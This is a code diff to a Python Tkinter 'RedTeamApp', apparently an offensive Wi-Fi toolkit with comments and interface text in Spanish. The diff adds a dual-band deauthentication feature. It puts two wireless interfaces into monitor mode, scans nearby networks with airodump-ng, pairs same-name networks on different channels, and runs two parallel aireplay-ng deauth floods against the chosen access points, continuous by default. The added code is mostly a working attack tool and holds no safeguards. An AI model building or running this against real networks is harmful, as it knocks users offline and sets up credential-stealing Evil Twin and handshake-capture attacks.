@@ -230,6 +230,86 @@ class ScrollableFrame(tk.Frame):
         widget.pack(**pack_options)
 
 
+class MultiDeauthAttack:
+    """
+    Gestión de dos procesos aireplay-ng en paralelo para desautenticación dual‑band.
+    Recibe:
+      - mon_ifaces: lista de dos interfaces en modo monitor (ej. ['wlan0mon','wlan1mon'])
+      - bssids:     lista con los dos BSSID objetivo
+      - channels:   lista con los canales correspondientes (ya deben estar fijados)
+      - burst:      número de paquetes (0 = infinito)
+      - callback:   función para escribir en la consola gráfica
+    """
+    def __init__(self, mon_ifaces, bssids, channels, burst, callback):
+        self.mon_ifaces = mon_ifaces
+        self.bssids = bssids
+        self.channels = channels
+        self.burst = burst
+        self.callback = callback
+        self.procs = []
+        self.threads = []
+        self._stop_flag = False
+
+    def start(self):
+        self._stop_flag = False
+        for i in range(2):
+            # Construir comando
+            cmd = [
+                "sudo", "aireplay-ng",
+                "--deauth", str(self.burst),
+                "-a", self.bssids[i],
+                self.mon_ifaces[i]
+            ]
+            self.callback(f"[*] Iniciando: {' '.join(cmd)}")
+            
+            # Lanzar proceso
+            proc = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=1
+            )
+            self.procs.append(proc)
+            
+            # Hilo lector de salida
+            t = threading.Thread(target=self._reader, args=(proc, i), daemon=True)
+            t.start()
+            self.threads.append(t)
+
+    def _reader(self, proc, idx):
+        try:
+            for line in iter(proc.stdout.readline, ''):
+                if self._stop_flag:
+                    break
+                if line:
+                    self.callback(f"[if{idx+1}] {line.rstrip()}")
+        except Exception as e:
+            self.callback(f"[!] Error en lector {idx+1}: {e}")
+        finally:
+            proc.stdout.close()
+
+    def stop(self):
+        self._stop_flag = True
+        for proc in self.procs:
+            try:
+                proc.terminate()
+            except Exception:
+                pass
+        # Dar tiempo a terminar y luego kill si es necesario
+        for proc in self.procs:
+            try:
+                proc.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                try:
+                    proc.kill()
+                except Exception:
+                    pass
+        self.procs.clear()
+        self.threads.clear()
+        self.callback("[+] Ambos procesos de deauth detenidos.")
+
+
 class TecladoNumerico(tk.Toplevel):
     def __init__(self, parent, variable_destino, titulo="Ingresar IP/Rango"):
         super().__init__(parent)
@@ -1193,6 +1273,7 @@ class RedTeamApp(tk.Tk):
             ("Captura Handshake", self._wifi_captura_handshake),
             ("Ataque Evil Twin", self._wifi_evil_twin),
             ("Desautenticación", self._wifi_deauth),
+            ("Deauth Múltiple (Dual‑Band)", self._wifi_deauth_multi),   # <-- NUEVO
             ("Explorar Handshakes", self._wifi_explorar_handshakes),
             ("Explorar Evil Twin", self._wifi_explorar_evil),
         ]
@@ -2080,6 +2161,290 @@ if __name__ == "__main__":
             self.deauth_proc = None
         
         threading.Thread(target=run_attack, daemon=True).start()
+
+
+    # ==========================================
+    # DEAUTH MÚLTIPLE DUAL‑BAND
+    # ==========================================
+    def _wifi_deauth_multi(self):
+        """Punto de entrada: muestra interfaces disponibles (debe haber al menos 2)."""
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_wifi_menu)
+        ttk.Label(self.main_frame, text="DEAUTH DUAL‑BAND", style='Title.TLabel').pack(pady=2)
+
+        interfaces = self.obtener_interfaces_red()
+        if len(interfaces) < 2:
+            ttk.Label(self.main_frame, text="Se necesitan al menos 2 interfaces físicas.",
+                      style='Dark.TLabel', foreground=COLOR_TEXTO_ADVERTENCIA).pack(pady=10)
+            self.mostrar_consola()
+            self.escribir_consola("[!] No hay suficientes interfaces para ataque dual.")
+            return
+
+        self.wifi_state.setdefault("dual_deauth", {})["selected"] = []
+        self.wifi_state["dual_deauth"]["iface_btns"] = []
+
+        scroll = ScrollableFrame(self.main_frame, max_items=10)
+        scroll.pack(fill='both', expand=True, padx=2, pady=2)
+
+        ttk.Label(scroll.scrollable_frame, text="Seleccione DOS interfaces:", style='Gray.TLabel').pack(pady=(0,4))
+        for iface in interfaces:
+            btn = scroll.add_button(text=iface, style='Red.TButton', width=28,
+                                    command=lambda i=iface: self._deauth_multi_select_iface(i))
+            if btn:
+                self.wifi_state["dual_deauth"]["iface_btns"].append(btn)
+
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+        gc.collect()
+
+    def _deauth_multi_select_iface(self, iface):
+        """Acumula interfaces seleccionadas; al elegir la segunda dispara el escaneo."""
+        state = self.wifi_state["dual_deauth"]
+        selected = state["selected"]
+        if iface in selected:
+            return
+        selected.append(iface)
+
+        # Feedback visual: deshabilitar el botón correspondiente
+        for btn in state["iface_btns"]:
+            if btn.cget("text") == iface:
+                btn.config(style='Gray.TButton')
+                btn.state(['disabled'])
+                break
+
+        if len(selected) == 2:
+            self.escribir_consola(f"[*] Interfaces seleccionadas: {selected[0]}, {selected[1]}")
+            self._deauth_multi_escanear(selected[0], selected[1])
+
+    def _deauth_multi_escanear(self, iface1, iface2):
+        """Pone ambas en monitor y escanea con la primera. Luego muestra redes."""
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_deauth_multi)
+        ttk.Label(self.main_frame, text="ESCANEANDO REDES...", style='Title.TLabel').pack(pady=2)
+        self.mostrar_consola()
+
+        self.wifi_state["dual_deauth"]["iface1"] = iface1
+        self.wifi_state["dual_deauth"]["iface2"] = iface2
+
+        scan_prefix = self._generar_nombre_temporal("dual_scan")
+
+        def preparar_y_escanear():
+            # Poner ambas en modo monitor
+            subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "airmon-ng", "start", iface1], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "airmon-ng", "start", iface2], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            mon1 = f"{iface1}mon" if os.path.exists(f"/sys/class/net/{iface1}mon") else iface1
+            mon2 = f"{iface2}mon" if os.path.exists(f"/sys/class/net/{iface2}mon") else iface2
+            self.wifi_state["dual_deauth"]["mon1"] = mon1
+            self.wifi_state["dual_deauth"]["mon2"] = mon2
+
+            self.after(0, lambda: self.escribir_consola(f"[*] Escaneando con {mon1} (15 s)..."))
+            subprocess.run(f"sudo timeout -k 5 15s airodump-ng {mon1} -w {scan_prefix} --output-format csv",
+                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+            redes = []
+            try:
+                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
+                    partes = f.read().split("Station MAC,")
+                    for linea in partes[0].split("\n")[2:]:
+                        r = linea.split(",")
+                        if len(r) >= 14 and ":" in r[0]:
+                            redes.append({
+                                "bssid": r[0].strip(),
+                                "ch": r[3].strip(),
+                                "essid": r[13].strip() if r[13].strip() else "<Oculta>"
+                            })
+            except Exception:
+                pass
+            finally:
+                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                    try: os.remove(f"{scan_prefix}{ext}")
+                    except: pass
+
+            self.after(0, lambda: self._deauth_multi_mostrar_redes(redes))
+
+        threading.Thread(target=preparar_y_escanear, daemon=True).start()
+
+    def _deauth_multi_mostrar_redes(self, redes):
+        """Clasifica redes en pares dual‑band y sueltas, y las muestra."""
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_deauth_multi)
+        ttk.Label(self.main_frame, text="SELECCIONA OBJETIVOS", style='Title.TLabel').pack(pady=2)
+
+        if not redes:
+            ttk.Label(self.main_frame, text="No se detectaron redes.", style='Dark.TLabel').pack()
+            return
+
+        # --- Clasificación ---
+        # Agrupar por ESSID (ignorando mayúsculas/minúsculas)
+        groups = {}
+        for r in redes:
+            key = r['essid'].lower()
+            groups.setdefault(key, []).append(r)
+
+        dual_pairs = []   # lista de tuplas (red1, red2)
+        singles = []
+        used = set()
+        for essid_lower, items in groups.items():
+            if len(items) >= 2:
+                # Buscar todas las combinaciones de canales distintos
+                for i in range(len(items)):
+                    for j in range(i+1, len(items)):
+                        if items[i]['ch'] != items[j]['ch']:
+                            dual_pairs.append((items[i], items[j]))
+                            used.add(items[i]['bssid'])
+                            used.add(items[j]['bssid'])
+            # Las redes que no se usaron en ningún par pasan a singles
+            for item in items:
+                if item['bssid'] not in used:
+                    singles.append(item)
+
+        # También incluir en singles las que no fueron emparejadas
+        # pero ya las hemos añadido en el bucle.
+
+        scroll = ScrollableFrame(self.main_frame, max_items=80)
+        scroll.pack(fill='both', expand=True, padx=5, pady=2)
+
+        # Sección "Redes dual‑band detectadas"
+        if dual_pairs:
+            ttk.Label(scroll.scrollable_frame, text="── Redes dual‑band detectadas ──",
+                      style='Mono.TLabel', foreground=COLOR_TEXTO_EXITO).pack(anchor='w', padx=5, pady=(5,2))
+            for red1, red2 in dual_pairs:
+                texto = f"{red1['essid']}  (CH{red1['ch']} + CH{red2['ch']})"
+                btn = ttk.Button(scroll.scrollable_frame, text=texto, style='Gray.TButton',
+                                 command=lambda r1=red1, r2=red2: self._deauth_multi_configurar_ataque(r1, r2))
+                btn.pack(fill='x', padx=10, pady=3)
+
+        # Sección "Otras redes disponibles"
+        if singles:
+            ttk.Label(scroll.scrollable_frame, text="── Otras redes disponibles ──",
+                      style='Mono.TLabel', foreground=COLOR_TEXTO_SECUNDARIO).pack(anchor='w', padx=5, pady=(8,2))
+            for red in singles:
+                texto = f"{red['essid']}  (CH{red['ch']})"
+                btn = ttk.Button(scroll.scrollable_frame, text=texto, style='Gray.TButton',
+                                 command=lambda r=red: self._deauth_multi_add_manual(r))
+                btn.pack(fill='x', padx=10, pady=2)
+
+        # Lista de selección manual (se muestran las dos seleccionadas si ya hay)
+        self.wifi_state["dual_deauth"]["manual_selection"] = []
+        self.wifi_state["dual_deauth"]["manual_btns"] = []
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+        gc.collect()
+
+    def _deauth_multi_add_manual(self, red):
+        """Permite seleccionar redes manualmente una a una (hasta dos)."""
+        state = self.wifi_state["dual_deauth"]
+        manual = state.setdefault("manual_selection", [])
+        if len(manual) >= 2:
+            return  # ya hay dos
+        if any(r['bssid'] == red['bssid'] for r in manual):
+            return  # ya está seleccionada
+
+        manual.append(red)
+        self.escribir_consola(f"[*] Seleccionada manualmente: {red['essid']} (CH{red['ch']})")
+
+        # Si ya hay dos, pasar directamente a configuración
+        if len(manual) == 2:
+            self._deauth_multi_configurar_ataque(manual[0], manual[1])
+
+    def _deauth_multi_configurar_ataque(self, red1, red2):
+        """
+        Muestra resumen, ajusta canales y permite elegir ráfaga.
+        red1 se asigna a la primera interfaz, red2 a la segunda.
+        """
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_deauth_multi)
+        ttk.Label(self.main_frame, text="CONFIGURAR ATAQUE DUAL", style='Title.TLabel').pack(pady=2)
+
+        mon1 = self.wifi_state["dual_deauth"]["mon1"]
+        mon2 = self.wifi_state["dual_deauth"]["mon2"]
+        iface1 = self.wifi_state["dual_deauth"]["iface1"]
+        iface2 = self.wifi_state["dual_deauth"]["iface2"]
+
+        # Guardar objetivos
+        self.wifi_state["dual_deauth"]["target1"] = red1
+        self.wifi_state["dual_deauth"]["target2"] = red2
+
+        # Mostrar resumen
+        resumen = (f"Ataque dual:\n"
+                   f"{red1['essid']} (CH {red1['ch']}) ← {iface1}\n"
+                   f"{red2['essid']} (CH {red2['ch']}) ← {iface2}")
+        ttk.Label(self.main_frame, text=resumen, style='Mono.TLabel',
+                  justify='center').pack(pady=10)
+
+        # Ajustar canales
+        self.escribir_consola(f"[*] Fijando canal {red1['ch']} en {mon1}")
+        subprocess.run(["sudo", "iw", "dev", mon1, "set", "channel", red1['ch']],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        self.escribir_consola(f"[*] Fijando canal {red2['ch']} en {mon2}")
+        subprocess.run(["sudo", "iw", "dev", mon2, "set", "channel", red2['ch']],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        # Selección de ráfaga (común para ambas)
+        ttk.Label(self.main_frame, text="Paquetes por ráfaga:", style='Gray.TLabel').pack(pady=(10,2))
+        burst_var = tk.StringVar(value="0")
+        burst_menu = ttk.OptionMenu(self.main_frame, burst_var, "0",
+                                    "Continuo (0)", "5", "15", style='Dark.TMenubutton')
+        burst_menu.pack()
+
+        # Botón de inicio
+        def iniciar():
+            burst_str = burst_var.get()
+            if burst_str == "Continuo (0)":
+                burst = "0"
+            else:
+                burst = burst_str
+            self._deauth_multi_iniciar_ataque(red1, red2, burst)
+
+        ttk.Button(self.main_frame, text="INICIAR ATAQUE DUAL", style='Red.TButton',
+                   command=iniciar).pack(pady=15, fill='x', padx=30)
+
+        self.mostrar_consola()
+        gc.collect()
+
+    def _deauth_multi_iniciar_ataque(self, red1, red2, burst):
+        """Crea la instancia MultiDeauthAttack y lanza los procesos."""
+        mon1 = self.wifi_state["dual_deauth"]["mon1"]
+        mon2 = self.wifi_state["dual_deauth"]["mon2"]
+
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_wifi_menu)  # no se puede volver atrás mientras ataca, pero dejamos menú
+        ttk.Label(self.main_frame, text="ATAQUE DUAL EN CURSO", style='Title.TLabel').pack(pady=5)
+
+        scroll = ScrollableFrame(self.main_frame, max_items=5)
+        scroll.pack(fill='both', expand=True, padx=2, pady=2)
+
+        # Botón de detención
+        self.btn_detener_dual = scroll.add_button(
+            text="DETENER DEAUTH DUAL",
+            command=self._deauth_multi_detener,
+            style='Danger.TButton',
+            width=28
+        )
+
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+
+        self.multi_deauth_instance = MultiDeauthAttack(
+            mon_ifaces=[mon1, mon2],
+            bssids=[red1['bssid'], red2['bssid']],
+            channels=[red1['ch'], red2['ch']],
+            burst=burst,
+            callback=self.escribir_consola
+        )
+
+        self.multi_deauth_instance.start()
+
+    def _deauth_multi_detener(self):
+        """Detiene el ataque dual y restaura la UI."""
+        if hasattr(self, 'btn_detener_dual') and self.btn_detener_dual.winfo_exists():
+            self.btn_detener_dual.config(style='Gray.TButton')
+            self.btn_detener_dual.state(['disabled'])
+
+        if hasattr(self, 'multi_deauth_instance') and self.multi_deauth_instance:
+            self.multi_deauth_instance.stop()
+            self.multi_deauth_instance = None
+
+        self.escribir_consola("[*] Ataque dual detenido. Puede volver al menú.")
 
 
 
